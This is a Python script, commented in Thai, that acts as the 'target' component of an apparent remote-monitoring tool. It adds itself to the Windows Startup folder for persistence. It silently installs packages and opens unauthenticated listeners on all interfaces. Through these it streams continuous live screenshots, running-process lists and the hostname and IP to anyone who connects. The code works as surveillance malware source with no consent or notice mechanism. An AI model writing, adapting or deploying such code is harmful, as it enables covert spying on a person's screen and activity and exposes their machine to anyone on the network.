import subprocess
import sys
import importlib.util
import os
import threading
import socket
import platform
import psutil
import cv2
import numpy as np
from PIL import ImageGrab
import pickle
import struct
import time

# ---------------------- ตรวจสอบ module ----------------------
required_modules = ["opencv-python", "numpy", "pillow", "psutil", "pyautogui"]
for module in required_modules:
    if importlib.util.find_spec(module) is None:
        print(f"[INFO] ติดตั้ง module: {module} ...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

# ---------------------- เพิ่มตัวเองให้รันอัตโนมัติ (Startup) ----------------------
def add_to_startup():
    try:
        startup = os.path.join(os.environ['APPDATA'],
                               'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        script_path = os.path.abspath(sys.argv[0])
        bat_path = os.path.join(startup, "target_auto_start.bat")
        with open(bat_path, "w") as f:
            f.write(f'@echo off\npython "{script_path}"\n')
        print("[INFO] เพิ่ม Target ให้รันอัตโนมัติแล้ว")
    except Exception as e:
        print("[ERROR] ไม่สามารถเพิ่ม Auto Start:", e)

add_to_startup()

# ---------------------- PORTS ----------------------
PORT_SCREEN = 5001
PORT_PROCESS = 5002
PORT_INFO = 5003
HOST = '0.0.0.0'

# ---------------------- Live Screen (JPEG บีบอัด) ----------------------
def handle_live_screen(conn):
    try:
        while True:
            img = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
            result, encimg = cv2.imencode('.jpg', frame, encode_param)
            data = pickle.dumps(encimg)
            message_size = struct.pack(">L", len(data))
            conn.sendall(message_size + data)
    except:
        conn.close()

# ---------------------- Process ----------------------
def handle_process(conn):
    try:
        processes = []
        for p in psutil.process_iter(['pid', 'name']):
            processes.append(f"{p.info['pid']}: {p.info['name']}")
        result = "\n".join(processes)
        conn.sendall(result.encode())
        conn.close()
    except:
        conn.close()

# ---------------------- Info ----------------------
def handle_info(conn):
    try:
        hostname = platform.node()
        ip_addr = socket.gethostbyname(socket.gethostname())
        conn.sendall(f"{hostname}|{ip_addr}".encode())
        conn.close()
    except:
        conn.close()

# ---------------------- Server Helper ----------------------
def start_server(port, handler):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, port))
    server.listen(5)
    print(f"[INFO] Target listening on port {port}")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handler, args=(conn,), daemon=True).start()

# ---------------------- Main ----------------------
if __name__ == "__main__":
    print("[INFO] Target is running...")
    threading.Thread(target=start_server, args=(PORT_SCREEN, handle_live_screen), daemon=True).start()
    threading.Thread(target=start_server, args=(PORT_PROCESS, handle_process), daemon=True).start()
    threading.Thread(target=start_server, args=(PORT_INFO, handle_info), daemon=True).start()

    while True:
        time.sleep(1)
